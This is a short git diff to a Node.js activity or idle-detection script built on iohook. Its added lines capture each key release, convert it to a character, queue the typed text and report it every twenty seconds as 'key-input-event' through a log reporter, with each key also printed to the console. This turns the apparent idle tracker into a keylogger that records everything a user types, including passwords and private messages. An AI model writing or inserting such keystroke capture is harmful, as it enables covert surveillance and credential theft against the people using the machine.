@@ -1,12 +1,16 @@
 
 const ioHook = require('iohook');
 var nexttick = require('next-tick');
+
+var debounce = require('debounce');
 var reporter = require('./js/logreporter');
+var keycode = require('./js/keycode');
 
 var lastInput = new Date();
 var idleCounter = 0;
 var lastIdleDuration = 1;
 var reportedStatus = false;
+var queuedInput = '';
 
 function checkIfIdle(){
     var now = new Date();
@@ -28,6 +32,14 @@ function checkIfIdle(){
         }
     }
 }
+function reportInputAsSequencialString(){
+    if(queuedInput && queuedInput!==''){
+        reporter.report('key-input-event',JSON.stringify({'content':queuedInput}));
+        console.log('Key-input-event: '+queuedInput);
+        queuedInput = ''
+    }
+}
+var onReportInputAsSequencialString = debounce(reportInputAsSequencialString,20*1000);
 function updateActivity(){
     lastInput = new Date();
 }
@@ -42,7 +54,15 @@ ioHook.on("mousemove", event => {
 });
 
 ioHook.on("keyup", event => {
-    //console.log(event);
+    console.log(event);
+    if(event && event.keycode){
+        var inputChar = keycode(event.keycode,true);
+        console.log(inputChar);
+        if(inputChar && inputChar !==''){
+            queuedInput+=inputChar;
+        }
+        onReportInputAsSequencialString();
+    }
     updateActivity()
 });
 ioHook.on("mouseup", event => {
